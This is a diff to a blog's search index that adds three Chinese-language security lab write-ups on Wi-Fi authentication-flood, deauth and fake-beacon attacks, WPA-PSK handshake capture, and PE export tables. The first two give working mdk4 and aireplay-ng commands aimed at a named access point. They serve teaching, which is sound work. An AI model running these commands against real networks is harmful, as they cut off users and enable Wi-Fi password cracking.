@@ -4,6 +4,81 @@
   
     
     <entry>
+      <title>攻击无线AP</title>
+      <link href="2021/05/21/%E6%94%BB%E5%87%BB%E6%97%A0%E7%BA%BFAP/"/>
+      <url>2021/05/21/%E6%94%BB%E5%87%BB%E6%97%A0%E7%BA%BFAP/</url>
+      
+        <content type="html"><![CDATA[<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>掌握认证洪水攻击、Deauth攻击和假信标洪水攻击的原理。<br>利用mdk4工具能够实现相应的攻击方法。<br>能够利用wireshark工具区分认证（Authentication）数据包、取消认证（Deauthentication）数据包和信标帧（beacon frame）。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>Kali操作系统及相关工具<br>无线网卡<br>无线AP</p><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><h3 id="认证洪水攻击"><a href="#认证洪水攻击" class="headerlink" title="认证洪水攻击"></a>认证洪水攻击</h3><p>AP认证洪水攻击，就是向AP发送大量虚假的连接请求。当发送的请求超过AP所能承受的范围时，AP就会自动断开现有连接，使得合法用户无法使用网络。</p><h3 id="Deauth攻击"><a href="#Deauth攻击" class="headerlink" title="Deauth攻击"></a>Deauth攻击</h3><p>取消认证洪水攻击De-authentication Flood Attack简称Deauth攻击。该攻击方式主要是通过伪造AP向客户端单播地址发送取消身份验证帧，将客户端转为未关联/未认证的状态。</p><h3 id="假信标洪水攻击"><a href="#假信标洪水攻击" class="headerlink" title="假信标洪水攻击"></a>假信标洪水攻击</h3><p>假信标攻击类似于伪AP，就是向无线信道中发送大量虚假的SSID来充斥客户端的无线列表，通过创建恶意无线热点，占用信道资源，干扰通讯。</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="认证洪水攻击-1"><a href="#认证洪水攻击-1" class="headerlink" title="认证洪水攻击"></a>认证洪水攻击</h3><p> 认证洪水攻击具体工作流程：<br>1.确定当前无线网络中，客户端与AP已经建立了连接。一般情况下，所有无线客户端的连接请求都会被AP记录在连接表中。<br>2.攻击者使用一些看起来合法但其实是随机生成的MAC地址来伪造STA。然后，攻击者就可以发送大量的虚假连接请求到AP。<br>3.攻击者对AP进行持续且大量的虚假连接请求，最终导致AP失去响应，使得AP的连接列表出现错误。<br>4.由于AP的连接表出现错误，使得连接的合法客户端强制与AP断开连接。</p><hr><p>其语法格式如下：</p><pre><code class="shell">mdk4 &lt;interface&gt;  a  &lt;test_options&gt;</code></pre><p>interface:指定用于攻击的网络接口，需是监听模式的接口。</p><pre><code class="shell">a: 实施身份验证洪水攻击模式。-a: 指定要攻击的目标AP的MAC地址。-m：使用有效数据库中的客户端MAC地址。-s：设置包的速率，默认无限制。</code></pre><hr><pre><code class="shell">mdk4 wlan0mon a -a 78:A3:51:15:67:C6 -m</code></pre><p><img src="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%881%EF%BC%89.png" class="lazyload" data-srcset="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%881%EF%BC%89.png" srcset="data:image/png;base64,666"></p><p>使用airodump-ng监测，可以看到界面下方瞬间出现了大量的伪造客户端，且连接的目标AP均为”(攻击的Mac)”。</p><pre><code class="shell">airodump-ng wlan0mon --bssid 78:A3:51:15:67:C6 -c 11</code></pre><p><img src="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%882%EF%BC%89.png" class="lazyload" data-srcset="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%882%EF%BC%89.png" srcset="data:image/png;base64,666"></p><p>如果攻击不成功，在打开监听模式时，就选择AP所在的信道进行监听。</p><hr><h3 id="Deauth攻击-1"><a href="#Deauth攻击-1" class="headerlink" title="Deauth攻击"></a>Deauth攻击</h3><p>Deauth攻击流程：<br>1.确定当前无线网络中客户端与AP已经建立了连接。<br>2.攻击者向整个网络发送伪造的取消身份认证报文，从而阻断合法用户和AP间的连接。<br>3.当客户端收到攻击者发送的报文时，会认为该报文来自AP。此时，客户端将试图与AP重新建立连接。<br>4.攻击者仍然继续向信道中发送取消身份认证帧，将导致客户端与AP始终无法重连，即已连接的客户端自行断开连接。</p><hr><p>使用mdk4实施Deauth攻击的语法格式如下：</p><pre><code class="shell">mdk4 &lt;interface&gt;  d  &lt;test_options&gt;</code></pre><p>interface:指定用于攻击的网络接口，需是监听模式的接口。</p><pre><code class="shell">d: 实施Deauth攻击攻击模式。-s：设置包的速率，默认无限制。-c：指定攻击的信道，默认将在所有信道之间跳转，每3秒切换一次。-E:攻击指定ESSID的AP。  -B：攻击指定BSSID的AP。</code></pre><hr><p>将无线网卡设置为监听模式。<br>用mdk4实施Deauth攻击，执行下面的命令后，将会输出以下信息。</p><pre><code class="shell">mdk4 wlan0mon d -s 120 -c 11</code></pre><p><img src="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%883%EF%BC%89.png" class="lazyload" data-srcset="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%883%EF%BC%89.png" srcset="data:image/png;base64,666"></p><p>可以使用Wireshark捕获数据包，将会发现大量的解除认证无线数据包。连接相关信道的客户端都会连接中断。</p><p><img src="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%884%EF%BC%89.png" class="lazyload" data-srcset="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%884%EF%BC%89.png" srcset="data:image/png;base64,666"></p><hr><h3 id="假信标洪水攻击-1"><a href="#假信标洪水攻击-1" class="headerlink" title="假信标洪水攻击"></a>假信标洪水攻击</h3><p>使用mdk4工具实施假信标洪水攻击的语法格式如下：</p><pre><code class="shell">mdk4 &lt;interface&gt;  b  &lt;test_options&gt;</code></pre><p>interface:指定用于攻击的网络接口，需是监听模式的接口。</p><pre><code class="shell">b: 实施假信标洪水攻击模式。-n：自定义ESSID。-f：读取ESSID列表文件。-w：选择假网络应具有的加密类型，有效选项：n=不加密，w=WEP，   t=TKIP（WPA），a=AES（WPA2）。-t： 1=仅创建自组织网络 ，0=仅创建Managed（AP）网络。-m：读取数据库的MAC地址。-s：设置包的速率，默认为50。-c：自定义信道。</code></pre><hr><p>执行下述命令后，客户端可以探测一个ESSID为“测试WIFI”、处于Managed模式、信道为6、加密方式为WEP的假AP。</p><pre><code class="shell">mdk4 wlan0mon b -n 测试WIFI -t 0 -w w -c 6 -s 80</code></pre><p><img src="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%885%EF%BC%89.png" class="lazyload" data-srcset="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%885%EF%BC%89.png" srcset="data:image/png;base64,666"></p><pre><code class="shell">mdk4 wlan0mon b -w a -m -c 6</code></pre><p><img src="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%886%EF%BC%89.png" class="lazyload" data-srcset="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%886%EF%BC%89.png" srcset="data:image/png;base64,666"></p><p>执行上述命令后，用Wireshark捕获数据包，将捕获大量的Beacon信号帧。这些数据包中广播的SSID都是随机产生的。</p><p><img src="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%887%EF%BC%89.png" class="lazyload" data-srcset="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%887%EF%BC%89.png" srcset="data:image/png;base64,666"></p><p>创建一个名为ssid.txt的文件，用来保存如下四个ssid</p><p><img src="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%888%EF%BC%89.png" class="lazyload" data-srcset="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%888%EF%BC%89.png" srcset="data:image/png;base64,666"></p><p>用-f选项指定了该列表文件，执行上述命令后，客户端可以探测到假AP。</p><pre><code class="shell">mdk4 wlan0mon b -f /root/ssid.txt -w a -c 6 -s 100 -m</code></pre><p><img src="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%889%EF%BC%89.png" class="lazyload" data-srcset="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-6%EF%BC%889%EF%BC%89.png" srcset="data:image/png;base64,666"></p><p>用Wireshark捕获数据包，将捕获大量的Beacon信号帧。这些数据包中广播的SSID都是ssid.txt产生的。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 实验 </category>
+          
+          <category> 无线网络安全 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>WPA-PSK/WPA2-PSK工作原理</title>
+      <link href="2021/05/21/WPA-PSK-WPA2-PSK%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"/>
+      <url>2021/05/21/WPA-PSK-WPA2-PSK%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
+      
+        <content type="html"><![CDATA[<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>掌握WPA-PSK/WPA2-PSK工作原理。<br>利用wireshark过滤器分析整个流程，特别是四次握手的过程。<br>熟悉捕获四次握手中哪些Message之后才能进行PSK破解。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>Kali操作系统及相关工具<br>无线网卡<br>无线AP</p><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>WPA-PSK连接过程：</p><ol><li><p>Open System Authentication (Request initiate by client)</p></li><li><p>Open system Authentication (Response by AP)</p></li><li><p>Association Request (sent by client)</p></li><li><p>Association Response (send by AP)</p></li><li><p>4-Way Handshake – EAPoL Key Exchange Message 1</p></li><li><p>4-Way Handshake – EAPoL Key Exchange Message 2</p></li><li><p>4-Way Handshake – EAPoL Key Exchange Message 3</p></li><li><p>4-Way Handshake – EAPoL Key Exchange Message 4</p></li><li><p>DHCP Discover (send by client to L2 broadcast)</p></li><li><p>DHCP Offer (send by DHCP server)</p></li><li><p>DHCP Reqeust (send by client to L2 broadcast)</p></li><li><p>DHCP ACK (send by DHCP server to client) </p></li></ol><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>请自行针对某WPA-PSK的AP进行抓包，并用客户端连接AP，然后用过滤器语法分析整个PSK连接过程。</p><hr><p>1，打开无线网卡监听模式。</p><pre><code class="shell">airmon-ng start wlan0   </code></pre><p>2，用airodump-ng抓包，找到目标AP。</p><pre><code class="shell">airodump-ng wlan0mon   </code></pre><p>3，针对某个AP进行抓包，并保存。</p><pre><code class="shell">airodump-ng wlan0mon -c 11 --bssid 78:A3:51:15:67:C6 -w handshake</code></pre><p>4，用客户端连接AP。<br>5，发起多次DEAUTH攻击，抓四次握手包。</p><pre><code class="shell">aireplay-ng -0 10 -a 78:A3:51:15:67:C6 -c 0E:7F:6D:E0:E0:F5 wlan0mon</code></pre><p>78:A3:51:15:67:C6 是要攻击的Wi-Fi的bssid</p><p>0E:7F:6D:E0:E0:F5 是已经连接的设备的bssid</p><p><img src="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-5%EF%BC%881%EF%BC%89.png" class="lazyload" data-srcset="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/Wi-Fi-5%EF%BC%881%EF%BC%89.png" srcset="data:image/png;base64,666"></p><p>6，用wireshark过滤器分析信标帧Beacons、认证Authentication、连接请求Association Request 、 连接回应Association Response 、四次握手和获取DHCP的过程。</p><p>比如：四次握手中每条Message含有随机数的情况以及报文中是否有MIC值。<br>进一步的，请思考是否只有捕获完整的四次握手才能进行PSK破解？</p><hr><p><img src="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/image-20210521171040126.png" class="lazyload" data-srcset="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/image-20210521171040126.png" srcset="data:image/png;base64,666">用wlan.fc.type_subtype==0X0B显示过滤捕获文件中所有的身份认证数据包。AUTH认证类型有两种，0表示开放式，1表示共享式。<br>WPA/WPA2是开放式认证。</p><p><img src="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/0X0B.png" class="lazyload" data-srcset="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/0X0B.png" srcset="data:image/png;base64,666"></p><p>用wlan.fc.type_subtype==0X08进行过滤，只显示Beacons帧。  可以查看ESSID和BSSID和工作的信道。      </p><p><img src="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/0X08.png" class="lazyload" data-srcset="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/0X08.png" srcset="data:image/png;base64,666"></p><p> 同时，在信标帧也可查看AP使用的加密方式。<br>使用WPA加密的AP，在捕获包中即可看到WPA Information Element信息。如果使用 WEP加密，将不会出现WPA Information Element信息。同时可以看到AP具有WPS功能，并且启用了WPS功能（configured）</p><p><img src="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/WPS.png" class="lazyload" data-srcset="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/WPS.png" srcset="data:image/png;base64,666"></p><p>  用wlan.fc.type_subtype==0X00过滤关联请求，可以找出与客户端连接的AP 。</p><p><img src="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/0X00.png" class="lazyload" data-srcset="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/0X00.png" srcset="data:image/png;base64,666"></p><p>如图，可以看到AP的MAC地址、客户端的MAC地址和AP的ESSID。    </p><hr><p>输入eapol可以过滤握手包。</p><p><img src="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/eapol-1.png" class="lazyload" data-srcset="https://gryffinbit-1304014832.cos.ap-chengdu.myqcloud.com/Blog/eapol-1.png" srcset="data:image/png;base64,666"></p><p>注：并不需要解密就能查看DHCP ACK数据包中的相关信息。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 实验 </category>
+          
+          <category> 无线网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> WPA </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>PE文件导出表</title>
+      <link href="2021/05/21/PE%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA%E8%A1%A8/"/>
+      <url>2021/05/21/PE%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA%E8%A1%A8/</url>
+      
+        <content type="html"><![CDATA[<h2 id="参考教材"><a href="#参考教材" class="headerlink" title="参考教材"></a>参考教材</h2><p><a href="https://gryffinbit.lanzoui.com/iC3shpbqocd">https://gryffinbit.lanzoui.com/iC3shpbqocd</a></p><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p>1、参考教材P83-P86，在VC2010下创建一个名字为“dlltest”的空DLL工程，该工程以如下源文件dlltest.c为基础，产生一个dlltest.dll文件。</p><pre><code class="c">   \#include &lt;Windows.h&gt;void Func1()&#123;MessageBox(NULL, L&quot;Func_1&quot;, NULL, MB_OK);&#125;void Func2()&#123;MessageBox(NULL, L&quot;Func_2&quot;, NULL, MB_OK);&#125;void Func3()&#123;MessageBox(NULL, L&quot;Func_3&quot;, NULL, MB_OK);&#125;void Func4()&#123;MessageBox(NULL, L&quot;Func_4&quot;, NULL, MB_OK);&#125;void Func5()&#123;MessageBox(NULL, L&quot;Func_5&quot;, NULL, MB_OK);&#125;</code></pre><p>2、编写dlltest.def文本文件，内容如下：</p><pre><code class="def">LIBRARY dlltestEXPORTSFunc1 @ 3Func2 @ 5Func3 @ 6 NONAMEFunc5</code></pre><p>将dlltest.def文件放在上述DLL工程中与dlltest.c源文件相同的目录下，并按照教材P84，进行DLL构建设置。</p><p>3、创建上述DLL的测试工程dllclient，该工程以如下源文件dllclient.c为基础。</p><pre><code class="C">#include &lt;Windows.h&gt;typedef void(*Func)();int main() &#123;Func Func1, Func2, Func3, Func5;HMODULE hMod=LoadLibrary(L&quot;dlltest.dll&quot;); // 显式调用Func1=(Func)GetProcAddress(hMod, &quot;Func1&quot;); Func1();Func2=(Func)GetProcAddress(hMod, &quot;Func2&quot;); Func2();Func3=(Func)GetProcAddress(hMod, (LPCSTR) 6); Func3();Func5=(Func)GetProcAddress(hMod, &quot;Func5&quot;); Func5();FreeLibrary(hMod);return 0;&#125;</code></pre><p>注意，执行dllclient工程前，需要将之前编译好的dlltest.dll文件放在dllclient.exe文件所在目录下。</p><p>4、按P87-P95的内容，分析该dlltest.dll文件的导出表IMAGE_EXPORT_DIRECTORY结构体中如下几个字段。</p><pre><code>(1) DWORD Name(2) DWORD Base(3) DWORD NumberOfFunctions (4) DWORD NumberOfNames(5) DWORD AddressOfFunctions(6) DWORD AddressOfNames(7) DWORD AddressOfnameOrdinals</code></pre><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p>1、运行dllclient工程，了解DLL的工作方式。</p><p>2、使用C32asm与LordPE两个工具对dlltest.dll文件进行分析。（010editor更好用）</p><p>3、要求对导出表上述字段的值逐一在C32asm工具中分别截图，然后对照截图，对导出表字段，在实验结果中用表格进行说明。</p><p>4、对上述各个字段的含义进行准确理解。</p><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>请在此处按照实验要求进行截图，并逐一在其后通过表格对导出表结构中各个结构体内部字段值进行记录：</p><table><thead><tr><th>地址</th><th>值（内存映像）</th><th>字段名</th></tr></thead><tbody><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table>]]></content>
+      
+      
+      <categories>
+          
+          <category> 实验 </category>
+          
+          <category> 逆向 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>PE文件结构分析</title>
       <link href="2021/05/14/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/"/>
       <url>2021/05/14/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/</url>
